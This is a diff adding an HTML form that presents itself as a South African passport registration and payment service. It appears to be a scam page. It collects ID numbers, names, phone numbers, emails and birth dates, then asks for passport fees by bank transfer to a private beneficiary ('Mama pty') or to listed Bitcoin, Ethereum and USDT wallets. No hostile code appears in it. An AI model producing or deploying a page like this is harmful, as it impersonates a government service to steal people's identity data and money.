@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Passport Registration</title>
+  <link rel="stylesheet" href="/css/registration.css">
+  <script src="/js/scripts.js" defer></script>
+</head>
+<body>
+  <h2>Step 1: Profile Registration</h2>
+  <form action="/register" method="POST">
+    <fieldset>
+      <legend>Enter Personal Details</legend>
+      <label>South African ID number:</label>
+      <input type="text" name="idNumber" required><br>
+      <label>Full name (as per ID):</label>
+      <input type="text" name="fullName" required><br>
+      <label>Valid cellphone number:</label>
+      <input type="text" name="cellphone" required><br>
+      <label>Email address:</label>
+      <input type="email" name="email" required>
+    </fieldset>
+    
+    <h2>Step 2: Application Submission</h2>
+    <fieldset>
+      <legend>Select Service & Complete Forms</legend>
+      <label>Select Service:</label>
+      <select name="serviceType" disabled>
+        <option>Passport Application</option>
+      </select><br>
+      <label>Choose Passport Type:</label>
+      <select name="passportType" required>
+        <option value="32-page">32-page</option>
+        <option value="48-page">48-page maxi</option>
+      </select><br>
+      <label>Marital Status:</label>
+      <select name="maritalStatus" required>
+        <option value="Single">Single</option>
+        <option value="Married">Married</option>
+        <option value="Divorced">Divorced</option>
+        <option value="Widow">Widow</option>
+      </select><br>
+      <label>Employment:</label>
+      <input type="text" name="employment"><br>
+      <label>Emergency Contact:</label>
+      <input type="text" name="emergencyContact"><br>
+      <label>Date of Birth:</label>
+      <input type="date" name="dob" required><br>
+      <label>Parental Consent (if under 18):</label>
+      <input type="checkbox" name="parentalConsent">
+    </fieldset>
+    
+    <h2>Step 3: Payment</h2>
+    <fieldset>
+      <legend>Payment Details</legend>
+      <p>Fees:</p>
+      <ul>
+        <li>R600 (32-page passport)</li>
+        <li>R1,200 (48-page maxi passport)</li>
+      </ul>
+      <label>Mode of Payment:</label>
+      <select name="paymentMode" id="paymentMode" required onchange="togglePaymentDetails()">
+        <option value="">Select Payment Mode</option>
+        <option value="Bank Transfer/Deposit">Bank Transfer/Deposit</option>
+        <option value="Cryptocurrency">Cryptocurrency</option>
+      </select>
+      <!-- Bank Transfer details -->
+      <div id="bankDetails" style="display:none;">
+        <p><strong>Bank Transfer/Deposit Details:</strong></p>
+        <p>Bank: FNB BANK</p>
+        <p>Beneficiary Name: Mama pty</p>
+        <p>Beneficiary Reference: 0672626266</p>
+        <p>Account Number: 62509963139</p>
+        <p>Payment Type: Immediate Payment (Just Once)</p>
+      </div>
+      <!-- Cryptocurrency details -->
+      <div id="cryptoDetails" style="display:none;">
+        <p><strong>Cryptocurrency Payment Details:</strong></p>
+        <p>Bitcoin Address: <span id="btcAddress">3Liim5xHAkLEgUjzfw2DNFqbEkzaXgWWu8</span> <button type="button" onclick="copyAddress('btcAddress')">Copy</button></p>
+        <p>Ethereum Wallet Address: <span id="ethAddress">0x5F3C7599C24e2018ffb26856f9719dab1144455C</span> <button type="button" onclick="copyAddress('ethAddress')">Copy</button></p>
+        <p>USDT (Tether) Wallet Address: <span id="usdtAddress">0x15B677f00Cba2311EFd3cE38CED5D7E8a621fCFF</span> <button type="button" onclick="copyAddress('usdtAddress')">Copy</button></p>
+      </div>
+    </fieldset>
+    <button type="submit">Submit</button>
+  </form>
+</body>
+</html>
